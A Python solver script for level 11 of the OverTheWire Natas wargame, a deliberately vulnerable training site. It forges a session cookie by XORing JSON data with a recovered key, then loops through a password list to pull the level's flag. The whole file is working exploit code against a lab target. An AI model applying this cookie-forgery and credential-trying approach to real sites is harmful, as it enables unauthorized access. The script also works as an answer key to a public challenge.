#!/usr/bin/env python


import requests
import re
import base64
import json
import urllib.parse

from pathlib import Path
from bs4 import BeautifulSoup


password_file = Path('../passwords.txt')

level = 11
username = '%s%s' % ('natas', level)
passwords = open(password_file, 'r').readlines()

url = 'http://%s.natas.labs.overthewire.org/' % username

# XOR function
def xor_crypt(text):

    encrypted_text = ''

    # Key from decrypted xor cipher and the known plaintext
    key = 'qw8J'

    # Iterate on the string per char on plaintext, and xor with key
    for i in range(len(text)):

        encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))

    return encrypted_text


# Default data, the known plaintext change to 'yes' to show the password
default_data = {'showpassword': 'yes', 'bgcolor': '#ffffff'}

# Convert dictionary to json string value with separators as per php json_encode()
plain_text = json.dumps(default_data, separators=(',', ':'))

# Plaintext XOR key
cookie = base64.b64encode(xor_crypt(plain_text).encode('utf-8'))

# URL encoding
cookie = urllib.parse.quote(cookie.decode('utf-8'))


if __name__ == '__main__':

    # Read passwords and enforce bruteforce
    for password in passwords:

        password = password.strip()

        # data cookie to be sent to the browser
        cookies = {
            'data': cookie
        }

        # print(cookies)

        # Pass the username, password and cookie to request
        http = requests.post(url, auth=(username, password), cookies=cookies)

        if http.status_code != 200:
            pass

        else:
            # Create a BS parser
            soup = BeautifulSoup(http.text, 'html.parser')

            # Get the div element with id name content and convert it to text
            result = soup.select('#content')[0].text

            # Get the exact match using a pattern and print
            flag = re.search(r'[a-zA-Z0-9]{32}', result).group(0)

            print(flag)

            # Save the flag
            with open('flag.txt', 'w') as out:
                out.write(flag)

                out.close()

            break
